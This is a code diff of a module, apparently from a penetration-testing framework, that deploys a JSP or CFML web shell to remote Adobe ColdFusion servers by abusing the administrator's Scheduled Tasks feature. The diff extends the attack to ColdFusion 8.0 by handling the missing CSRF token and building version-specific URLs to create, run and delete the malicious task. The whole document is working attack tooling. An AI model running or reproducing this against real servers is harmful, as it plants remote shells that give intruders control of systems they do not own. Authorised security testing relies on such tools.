@@ -12,9 +12,14 @@ import utility
 
 
 title = CINTERFACES.CFM
-versions = ['9.0', '10.0'] # needs testing for older versions
+versions = ['8.0', '9.0', '10.0'] # needs testing for older versions
 def deploy(fingerengine, fingerprint):
-    """
+    """ This is currently a little messy since all major versions
+    have slight differences between them.  If 6.x/7.x are significantly
+    different, I may split these out.
+
+    This module invokes the Scheduled Tasks feature of CF to deploy
+    a JSP or CFML shell to the remote CF server.  This requires auth.
     """
 
     cfm_path = abspath(fingerengine.options.deploy)
@@ -66,7 +71,6 @@ def create_task(ip, fingerprint, cfm_file, root):
 
     (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
     data = {
-            "csrftoken" : csrf,
             "TaskName" : cfm_file,
             "Start_Date" : "Jan 27, 2014", # shouldnt matter since we force run
             "ScheduleType" : "Once",
@@ -78,8 +82,15 @@ def create_task(ip, fingerprint, cfm_file, root):
             "adminsubmit" : "Submit"
            }
 
+    # version-specific settings
+    if fingerprint.version in ["9.0", "10.0"]:
+        data['csrftoken'] = csrf
+
     if fingerprint.version in ["10.0"]:
         data['publish_overwrite'] = 'on'
+    
+    if fingerprint.version in ["8.0"]:
+        data['taskNameOrig'] = ""
 
     response = utility.requests_get(url, cookies=cookie)
     if response.status_code is 200:
@@ -89,6 +100,8 @@ def create_task(ip, fingerprint, cfm_file, root):
                         headers={'Content-Type':'application/x-www-form-urlencoded'})
         if response.status_code is 200:
             return True
+        else:
+            utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR);
 
 
 def delete_task(ip, fingerprint, cfm_file):
@@ -98,13 +111,16 @@ def delete_task(ip, fingerprint, cfm_file):
     url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm".\
                                                 format(ip, fingerprint.port)
 
-    if fingerprint.version in ["9.0"]:
-        uri = "?action=delete&task={0}&csrftoken={1}"
-    elif fingerprint.version in ["10.0"]:
-        uri = "?action=delete&task={0}&group=default&mode=server&csrftoken={1}"
-
     (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
-    response = utility.requests_get(url + uri.format(cfm_file, csrf), cookies=cookie)
+    if fingerprint.version in ["8.0"]:
+        uri = "?action=delete&task={0}".format(cfm_file)
+    elif fingerprint.version in ["9.0"]:
+        uri = "?action=delete&task={0}&csrftoken={1}".format(cfm_file, csrf)
+    elif fingerprint.version in ["10.0"]:
+        uri = "?action=delete&task={0}&group=default&mode=server&csrftoken={1}"\
+                                                        .format(cfm_file, csrf)
+
+    response = utility.requests_get(url + uri, cookies=cookie)
     if not response.status_code is 200:
         utility.Msg("Failed to remove task.  May require manual removal.", LOG.ERROR)
 
@@ -126,7 +142,9 @@ def run_task(ip, fingerprint, cfm_path):
 
     (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
     
-    if fingerprint.version in ["9.0"]:
+    if fingerprint.version in ["8.0"]:
+        uri = "?runtask={0}&timeout=0".format(cfm_name)
+    elif fingerprint.version in ["9.0"]:
         uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)
     elif fingerprint.version in ["10.0"]:
         uri = "?runtask={0}&group=default&mode=server&csrftoken={1}".format(cfm_name, csrf)
@@ -148,6 +166,10 @@ def fetch_csrf(ip, fingerprint, url):
     Returns a tuple of (cookie, csrftoken)
     """
 
+    if fingerprint.version not in ['9.0', '10.0']:
+        # versions <= 8.x do not use a CSRF token
+        return (checkAuth(ip, fingerprint.port, title, fingerprint.version)[0], None)
+
     # lets try and fetch CSRF
     cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
     if cookies:
@@ -162,7 +184,7 @@ def fetch_csrf(ip, fingerprint, url):
         if len(token) > 0:
             return (cookies[0], token[0])
         else:
-            utility.Msg("CSRF appears to be disabled.")
+            utility.Msg("CSRF appears to be disabled.", LOG.DEBUG)
             return (cookies[0], None)
 
 
@@ -201,6 +223,8 @@ def set_template(ip, fingerprint, root, cfm_file):
                                 .format(ip, fingerprint.port)
 
     template_handler = '/' + root.rsplit('\\', 1)[1] + '/' + cfm_file
+    utility.Msg("Setting template handler to %s" % template_handler, LOG.DEBUG)
+
     (cookie, csrftoken) = fetch_csrf(ip, fingerprint, url)
     data = {
             "csrftoken" : csrftoken,
